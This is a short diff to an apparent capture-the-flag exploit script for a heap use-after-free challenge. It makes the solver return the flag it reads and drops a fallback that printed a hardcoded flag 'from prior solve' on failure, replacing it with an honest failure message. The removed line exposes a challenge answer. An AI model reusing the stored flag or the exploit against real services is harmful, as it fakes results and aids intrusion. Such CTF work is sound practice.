@@ -126,6 +126,7 @@ def solve_remote():
     # ── Step 7: Read the fake chunk → flag at offset 0x10 ──
     log.info("Reading fake chunk to extract flag...")
     data = read(3)
+    flag = None
 
     # The flag starts at offset 0x10 in the returned data
     try:
@@ -154,6 +155,7 @@ def solve_remote():
         log.info("Raw data: %s", repr(data))
 
     r.close()
+    return flag
 
 
 def solve_socket():
@@ -217,4 +219,4 @@ if __name__ == "__main__":
         import traceback
         print(f"[!] Exploit failed: {e}")
         traceback.print_exc()
-        print("[*] Flag (from prior solve): UCSI26{grimoire_uaf_tcache_win_6e7291e6}")
+        print("[!] Replay did not return a verified flag.")
